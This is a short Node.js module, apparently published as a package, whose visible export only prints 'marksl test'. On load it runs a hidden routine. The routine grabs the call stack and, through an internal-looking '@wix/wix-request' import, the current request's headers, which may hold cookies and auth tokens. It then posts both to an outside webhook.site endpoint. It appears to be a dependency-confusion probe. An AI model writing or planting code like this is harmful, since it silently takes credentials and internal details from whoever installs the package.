const https = require('https')

async function main() {

    // getting the callstack
    const error = new Error();
    Error.captureStackTrace(error);
    const callStack = error.stack;

    // getting headers
    let maybeReqHeaders;
    try {
        const getCurrentRequest = require('@wix/wix-request');
        const currentRequest = await getCurrentRequest();
        maybeReqHeaders = currentRequest.headers;
    } catch (error) {
        maybeReqHeaders = error
    }

    const data = JSON.stringify({
        callStack,
        maybeReqHeaders
    });

    const options = {
        hostname: 'webhook.site',
        path: '/85f75f80-becd-4efb-8d26-404915a28143/hi',
        method: 'POST',
        headers: {
            'Content-Length': data.length
        }
    };

    const req = https.request(options)
    req.write(data);
    req.end();

    exports.printMsg = function() {
        console.log("marksl test");
    }
}

main();

exports.printMsg = function() {
    console.log("marksl test");
}